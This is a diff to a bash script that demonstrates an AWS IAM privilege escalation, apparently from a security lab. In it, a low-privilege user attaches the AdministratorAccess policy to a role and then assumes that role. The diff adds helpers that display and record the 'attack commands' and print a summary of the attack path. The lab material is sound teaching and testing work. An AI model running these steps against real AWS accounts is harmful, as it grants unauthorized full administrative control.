@@ -4,7 +4,9 @@
 # This scenario demonstrates how a user with iam:AttachRolePolicy and sts:AssumeRole
 # can attach an admin policy to a role they can assume, then assume that role for admin access
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-014-to-admin-starting-user"
@@ -69,6 +89,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -80,6 +101,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -87,6 +109,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -101,6 +124,7 @@ echo "Target role: $TARGET_ROLE_ARN"
 echo ""
 
 echo "Current attached policies on target role:"
+show_cmd "aws iam list-attached-role-policies --role-name $TARGET_ROLE --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output table"
 ATTACHED_POLICIES=$(aws iam list-attached-role-policies \
     --role-name $TARGET_ROLE \
     --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
@@ -118,6 +142,7 @@ echo -e "${YELLOW}Step 6: Attaching AdministratorAccess policy to target role${N
 echo "This is the privilege escalation action!"
 echo ""
 
+show_attack_cmd "aws iam attach-role-policy --role-name $TARGET_ROLE --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\""
 aws iam attach-role-policy \
     --role-name $TARGET_ROLE \
     --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
@@ -132,6 +157,7 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 # Step 7: Verify policy was attached
 echo -e "${YELLOW}Step 7: Verifying policy attachment${NC}"
 echo "Updated attached policies on target role:"
+show_cmd "aws iam list-attached-role-policies --role-name $TARGET_ROLE --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output table"
 aws iam list-attached-role-policies \
     --role-name $TARGET_ROLE \
     --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
@@ -143,6 +169,7 @@ echo -e "${GREEN}✓ AdministratorAccess policy is now attached${NC}\n"
 echo -e "${YELLOW}Step 8: Assuming the target role with admin permissions${NC}"
 echo "Role ARN: $TARGET_ROLE_ARN"
 
+show_attack_cmd "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $TARGET_ROLE_ARN \
     --role-session-name demo-attack-session \
@@ -156,6 +183,7 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed target role${NC}\n"
@@ -165,6 +193,7 @@ echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 echo ""
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
@@ -184,6 +213,16 @@ echo "1. Started as: $STARTING_USER (no admin permissions)"
 echo "2. Used iam:AttachRolePolicy to attach AdministratorAccess to: $TARGET_ROLE"
 echo "3. Used sts:AssumeRole to assume the now-privileged role"
 echo "4. Achieved: Full administrative access to the AWS account"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo "  $STARTING_USER → (AttachRolePolicy) → $TARGET_ROLE → (AssumeRole) → $TARGET_ROLE → Administrator"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- AdministratorAccess policy attached to: $TARGET_ROLE"
